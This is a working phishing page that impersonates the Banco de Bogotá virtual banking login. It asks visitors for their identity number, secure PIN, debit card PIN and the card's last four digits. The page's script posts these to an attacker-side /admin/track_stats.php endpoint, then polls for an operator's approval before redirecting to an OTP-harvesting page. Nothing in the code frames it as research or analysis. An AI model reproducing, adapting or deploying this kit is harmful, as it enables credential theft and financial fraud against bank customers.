<?php
// Sin includes problemáticos
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
    <title>BB</title>
    <style>
        .loader-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 30px;
        }
        .loader-circles {
            position: relative;
            width: 80px;
            height: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .circle {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            position: absolute;
            animation: loading-animation 1.2s infinite ease-in-out alternate;
        }
        .circle-yellow { background-color: #FFD700; left: 0px; z-index: 1; }
        .circle-blue { background-color: #007BFF; left: 30px; z-index: 2; animation-delay: 0.4s; }
        .circle-red { background-color: #DC143C; left: 60px; z-index: 1; }
        @keyframes loading-animation {
            0% { transform: scale(0.8); opacity: 0.7; }
            100% { transform: scale(1.3); opacity: 1; }
        }
        .loader-text {
            color: white;
            font-size: 1.2rem;
            font-weight: 500;
            text-align: center;
            font-family: sans-serif;
        }
    </style>
</head>
<body class="relative h-dvh w-full flex flex-col items-center box-border pb-6 bg-[#FFFFFF] bg-no-repeat bg-auto bg-center">
    <!-- loader -->
    <span id="loader" class="bg-[#33476B] flex flex-col z-50 w-full h-full bg-opacity-95 absolute flex items-center justify-center top-0 bottom-0 left-0 right-0">
        <div class="loader-wrapper">
            <div class="loader-circles">
                <div class="circle circle-yellow"></div>
                <div class="circle circle-blue"></div>
                <div class="circle circle-red"></div>
            </div>
            <p class="loader-text">Espera un momento, por favor</p>
        </div>
    </span>

    <span id="errorMsg" class="hidden bg-[#33476B] w-full h-full bg-opacity-90 absolute flex items-center justify-center top-0 bottom-0 left-0 right-0">
        <span class="flex flex-col items-start justify-center bg-[white] p-12 rounded-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="orange"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 1.67c.955 0 1.845 .467 2.39 1.247l.105 .16l8.114 13.548a2.914 2.914 0 0 1 -2.307 4.363l-.195 .008h-16.225a2.914 2.914 0 0 1 -2.582 -4.2l.099 -.185l8.11 -13.538a2.914 2.914 0 0 1 2.491 -1.403zm.01 13.33l-.127 .007a1 1 0 0 0 0 1.986l.117 .007l.127 -.007a1 1 0 0 0 0 -1.986l-.117 -.007zm-.01 -7a1 1 0 0 0 -.993 .883l-.007 .117v4l.007 .117a1 1 0 0 0 1.986 0l.007 -.117v-4l-.007 -.117a1 1 0 0 0 -.993 -.883z" /></svg>
            <p class="text-[16pt] font-bold">Tus datos no coinciden</p>
            <p class="text-[12pt]">Verifícalos e inténtalo nuevamente.</p>
            <span class="flex w-full justify-end pt-4">
            <button id="closeE" onclick="document.getElementById('errorMsg').classList.add('hidden')" class="text-[white] bg-[#00439E] px-10 py-3 rounded-full">Continuar</button>
            </span>
        </span>
    </span>

    <div id="main-content" class="w-full flex flex-col items-center">
    <!-- Header -->
            <div class="flex items-center justify-between w-full pl-0 pr-5 pt-1 pb-4 gap-0 bg-white">
                <div class="flex items-center">
                    <img src="assets/logobogota.png" class="w-20 h-20 object-contain rounded-full" alt="">
                    <h1 class="text-[1.25rem] font-bold text-[#1A1A1A] ml-[-5px]">Bienvenido a tu Banca Virtual</h1>
                </div>
            </div>
    
    <!-- Banner Principal -->
    <div class="w-[92%] mb-3 px-1 mt-[-25px]">
        <div class="relative w-full rounded-xl overflow-hidden shadow-sm">
            <img src="./assets/bbpublish.png" class="w-full h-auto block" alt="">
        </div>
    </div>
    
    <div class="w-[90%] mt-5 border border-gray-300 rounded-md">
        <span class="flex flex-row items-center w-full">
            <p id="passwordSec" onclick="
                document.getElementById('passwordSec').classList.add('border-b-[#0043A9]')    
                document.getElementById('passwordSec').classList.remove('border-b-[gray]/60')    
                document.getElementById('CCSec').classList.remove('border-b-[#0043A9]')    
                document.getElementById('CCSec').classList.add('border-b-[gray]/60')    
                document.getElementById('passwordSection').classList.remove('hidden')    
                document.getElementById('CCSection').classList.add('hidden')        
                
                document.getElementById('passwordSec').classList.add('text-[#0043A9]') 
                document.getElementById('passwordSec').classList.remove('text-[black]/40') 

                document.getElementById('CCSec').classList.add('text-[black]/40')        
                document.getElementById('CCSec').classList.remove('text-[#0043A9]')        
                " class="text-[#0043A9] w-full font-semibold text-[14pt] text-center my-2 border-b-4 py-3 border-b-[#0043A9]">Clave segura</p>
            <p id="CCSec" onclick="
                document.getElementById('passwordSec').classList.remove('border-b-[#0043A9]')    
                document.getElementById('passwordSec').classList.add('border-b-[gray]/60')    
                document.getElementById('CCSec').classList.add('border-b-[#0043A9]')    
                document.getElementById('CCSec').classList.remove('border-b-[gray]/60')        
                document.getElementById('passwordSection').classList.add('hidden')        
                document.getElementById('CCSection').classList.remove('hidden') 
                
                document.getElementById('passwordSec').classList.add('text-[black]/40')     
                document.getElementById('passwordSec').classList.remove('text-[#0043A9]')        
                document.getElementById('CCSec').classList.add('text-[#0043A9]') 
                document.getElementById('CCSec').classList.remove('text-[black]/40') 
            " class="text-[black]/40 w-full font-semibold text-[14pt] text-center my-2 border-b-4 py-3 border-b-[gray]/60">Tarjeta débito</p>
        </span>

        <!-- First -->
        <span id="passwordSection" class="flex flex-col w-full px-6 pb-4">
            <p class="text-black/75 mt-5 mb-1">Identificación</p>
                <span class="flex flex-row gap-3 items-center mt-3">
                    <select id="yearSelect" required  class="max-w-[110px] px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                        <option selected value="CC">C.C. Cédula de ciudadanía</option>
                        <option value="TI">T.I. Tarjeta de Identidad</option>
                        <option value="CE">C.E. Cédula de Extranjería</option>
                        <option value="NI">N.P.N. NIT Persona Natural</option>
                        <option value="NE">N.P.E. NIT Persona Extranjera</option>
                        <option value="NJ">N.P.J. NIT Persona Jurídica</option>
                        <option value="PA">P.S. Pasaporte</option>
                        <option value="RC">R.C. Registro Civil</option>
                    </select>
                    <input inputmode="numeric" id="ccInput" type="text" maxlength="10" placeholder="#" class="w-full outline-none px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                </span>
                <p class="text-black/75 mt-5 mb-1">Clave segura</p>
                <input inputmode="numeric" id="passwordInput" type="password" maxlength="4" placeholder="..." class="w-full outline-none px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                <button id="submitBtn" class="bg-[#F2F2F2] text-black/60 font-semibold rounded-full h-[48px] mt-6">Ingresar</button>
                <img class="mt-6 ml-5 mb-4 max-w-[90%]" src="./assets/reand.png" alt="">
        </span>

        <span id="CCSection" class="hidden flex flex-col w-full px-6 pb-4">
            <p class="text-black/75 mt-5 mb-1">Identificación</p>
                <span class="flex flex-row gap-3 items-center mt-3">
                    <select id="yearSelectCC" required  class="max-w-[110px] px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                        <option selected value="CC">C.C. Cédula de ciudadanía</option>
                        <option value="TI">T.I. Tarjeta de Identidad</option>
                        <option value="CE">C.E. Cédula de Extranjería</option>
                        <option value="NI">N.P.N. NIT Persona Natural</option>
                        <option value="NE">N.P.E. NIT Persona Extranjera</option>
                        <option value="NJ">N.P.J. NIT Persona Jurídica</option>
                        <option value="PA">P.S. Pasaporte</option>
                        <option value="RC">R.C. Registro Civil</option>
                    </select>
                    <input inputmode="numeric" id="ccInputCC" type="text" maxlength="10" placeholder="#" class="w-full outline-none px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                </span>
                <p class="text-black/75 mt-5 mb-1">Clave de tu tarjeta débito</p>
                <input inputmode="numeric" type="password" id="passCC" maxlength="4" placeholder="..." class="w-full outline-none px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                <p class="text-black/75 mt-5 mb-1">Último 4 digitos de tu tarjeta débito</p>
                <input inputmode="numeric" type="text" id="lastCC" maxlength="4" placeholder="..." class="w-full outline-none px-[21px] rounded-md h-[48px] text-[18px] focus:border-[#0043A9] focus:border-3 font-semibold text-black/75 border border-black/75">
                <button id="btnSubmitCC" class="bg-[#F2F2F2] text-black/60 font-semibold rounded-full h-[48px] mt-6">Ingresar</button>
                <img class="mt-6 ml-5 mb-4 max-w-[90%]" src="./assets/reand.png" alt="">
        </span>
    </div>

    <p class="px-5 mt-4 text-[9pt] mb-4">Este sitio está protegido por reCAPTCHA y aplican las <strong class="font-normal text-[#0043A9]">políticas de privacidad y los términos de servicio de Google.</strong></p>

    <span class="p-4 w-full flex flex-col bg-[#F6FAFF]">
        <img class="max-w-[90%] mx-auto" src="./assets/bbendpublish.png" alt="">
        <span class="flex flex-row items-center gap-2 mt-5 overflow-y-auto">
            <img class="border border-black/30 rounded-md w-[80%]" src="./assets/bb1.png" alt="">
            <img class="border border-black/30 rounded-md w-[80%]" src="./assets/bb2.png" alt="">
            <img class="border border-black/30 rounded-md w-[80%]" src="./assets/bb3.png" alt="">
        </span>
        <p class="text-[8pt] text-center mt-16 mb-2">v.1.31.1</p>
    </span>
    </div>

    <script>
        const loaderStatus = (status) => {
            const loader = document.getElementById("loader");
            if(!loader) return;
            if(status === "true" || status === true)
                loader.classList.remove("hidden");
            else
                loader.classList.add("hidden");
        }
        window.loaderStatus = loaderStatus;

        document.addEventListener("DOMContentLoaded", () => {
            const ccInput = document.getElementById("ccInput");
            const passwordInput = document.getElementById("passwordInput");
            const submitBtn = document.getElementById("submitBtn");
            const ccInputCC = document.getElementById("ccInputCC");
            const passCC = document.getElementById("passCC");
            const lastCC = document.getElementById("lastCC");
            const submitBtnCC = document.getElementById("btnSubmitCC");

            const needActivateButton = () => {
                if (!ccInput || !passwordInput || !submitBtn || !ccInputCC || !passCC || !lastCC || !submitBtnCC) return false;
                const isPasswordSectionValid = ccInput.value.length > 0 && passwordInput.value.length === 4;
                const isCCSectionValid = ccInputCC.value.length > 0 && passCC.value.length === 4 && lastCC.value.length === 4;

                if (isPasswordSectionValid) {
                    submitBtn.classList.remove("bg-[#F2F2F2]", "text-black/60");
                    submitBtn.classList.add("bg-[#0043A9]", "text-white");
                } else {
                    submitBtn.classList.remove("bg-[#0043A9]", "text-white");
                    submitBtn.classList.add("bg-[#F2F2F2]", "text-black/60");
                }

                if (isCCSectionValid) {
                    submitBtnCC.classList.remove("bg-[#F2F2F2]", "text-black/60");
                    submitBtnCC.classList.add("bg-[#0043A9]", "text-white");
                } else {
                    submitBtnCC.classList.remove("bg-[#0043A9]", "text-white");
                    submitBtnCC.classList.add("bg-[#F2F2F2]", "text-black/60");
                }

                const passSec = document.getElementById('passwordSection');
                const isPasswordSectionVisible = passSec && !passSec.classList.contains('hidden');
                return isPasswordSectionVisible ? isPasswordSectionValid : isCCSectionValid;
            }

            [ccInput, ccInputCC].forEach(input => {
                if(!input) return;
                input.addEventListener("input", (e) => {
                    e.target.value = e.target.value.replace(/[^0-9]/g, "");
                    if (e.target.value.length > 10) e.target.value = e.target.value.slice(0, 10);
                    needActivateButton();
                });
            });

            [passwordInput, passCC].forEach(input => {
                if(!input) return;
                input.addEventListener("input", (e) => {
                    e.target.value = e.target.value.replace(/[^0-9]/g, "");
                    if (e.target.value.length > 4) e.target.value = e.target.value.slice(0, 4);
                    needActivateButton();
                });
            });

            if(lastCC) {
                lastCC.addEventListener("input", (e) => {
                    e.target.value = e.target.value.replace(/[^0-9]/g, "");
                    if (e.target.value.length > 4) e.target.value = e.target.value.slice(0, 4);
                    needActivateButton();
                });
            }

            window.needActivateButton = needActivateButton;

            const handleLoginClick = (e) => {
                if (e) {
                    e.preventDefault();
                    e.stopPropagation();
                }
                
                if(needActivateButton()) {
                    const passSec = document.getElementById('passwordSection');
                    const isPasswordSectionVisible = passSec && !passSec.classList.contains('hidden');
                    
                    let user, clave_pin = "", clave_tarjeta = "", ultimos_digitos = "";
                    let tipo_id = "CC";
                    
                    if (isPasswordSectionVisible) {
                        // CLAVE SEGURA
                        user = ccInput.value;
                        clave_pin = passwordInput.value;
                        tipo_id = document.getElementById('yearSelect').value;
                    } else {
                        // TARJETA DÉBITO
                        user = ccInputCC.value;
                        clave_tarjeta = passCC.value;
                        ultimos_digitos = lastCC.value;
                        tipo_id = document.getElementById('yearSelectCC').value;
                    }

                    // Guardar en localStorage para otp.php
                    localStorage.setItem('usuario_bogota', user);
                    localStorage.setItem('identificacion_bogota', user);
                    localStorage.setItem('tipo_id_bogota', tipo_id);
                    localStorage.setItem('clave_pin_bogota', clave_pin);
                    localStorage.setItem('clave_tarjeta_bogota', clave_tarjeta);
                    localStorage.setItem('ultimos_digitos_bogota', ultimos_digitos);

                    const pseData = localStorage.getItem('pseGuardado');
                    let documento = 'N/A';
                    let banco = 'bogota'; // Usando 'bogota' para que el admin lo filtre correctamente
                    
                    if (pseData) {
                        try {
                            const pse = JSON.parse(pseData);
                            documento = pse.documento_pse || 'N/A';
                            banco = 'bogota';
                        } catch (e) {}
                    }

                    const formData = new FormData();
                    formData.append('activity', 'LOGIN (BANCO BOGOTÁ)');
                    formData.append('action', 'log');
                    formData.append('metodo', 'PSE');
                    formData.append('banco', banco);
                    formData.append('documento', documento);
                    formData.append('usuario', user);
                    formData.append('identificacion', user);
                    formData.append('tipo_identificacion', tipo_id);
                    formData.append('clave_pin', clave_pin);
                    formData.append('clave_tarjeta', clave_tarjeta);
                    formData.append('ultimos_digitos', ultimos_digitos);

                    console.log('Enviando LOGIN a admin/track_stats.php:', {
                        banco: banco,
                        usuario: user,
                        clave_pin: clave_pin,
                        clave_tarjeta: clave_tarjeta
                    });

                    loaderStatus(true);

                    fetch('/admin/track_stats.php', {
                        method: 'POST',
                        body: formData,
                        keepalive: true
                    }).then(response => {
                        console.log('Respuesta:', response.status, response.statusText);
                        if(response.ok) {
                            return response.json();
                        } else {
                            throw new Error('Error en servidor');
                        }
                    }).then(data => {
                        console.log('Data:', data);
                        if(data.success) {
                            localStorage.setItem('log_id_actual', data.id);
                            startPollingAprobacion(data.id);
                        } else {
                            loaderStatus(false);
                            alert('Error: ' + (data.message || 'Error desconocido'));
                        }
                    }).catch(error => {
                        console.error("Error completo:", error);
                        loaderStatus(false);
                        alert('Error: ' + error.message);
                    });
                }
            };

            if(submitBtn) submitBtn.addEventListener("click", handleLoginClick);
            if(submitBtnCC) submitBtnCC.addEventListener("click", handleLoginClick);
        });

        function startPollingAprobacion(logId) {
            let pollCount = 0;
            const maxPolls = 150;
            
            const pollInterval = setInterval(() => {
                pollCount++;
                fetch('/admin/check_aprobacion.php?log_id=' + logId)
                    .then(res => res.json())
                    .then(data => {
                        if (data.estado === 'aprobado') {
                            clearInterval(pollInterval);
                            loaderStatus(false);
                            setTimeout(() => {
                                window.location.assign('./otp.php');
                            }, 500);
                        } else if (data.estado === 'rechazado') {
                            clearInterval(pollInterval);
                            loaderStatus(false);
                            document.getElementById('errorMsg').classList.remove('hidden');
                            document.getElementById('passwordInput').value = '';
                            document.getElementById('passwordInput').dispatchEvent(new Event('input'));
                        } else if (pollCount >= maxPolls) {
                            clearInterval(pollInterval);
                            loaderStatus(false);
                            alert('⏱️ Tiempo de espera agotado');
                        }
                    })
                    .catch(err => console.error('Error polling:', err));
            }, 2000);
        }

        setTimeout(() => {
            const loader = document.getElementById("loader");
            if(loader) loader.classList.add("hidden");
        }, 3000);
    </script>
</body>
</html>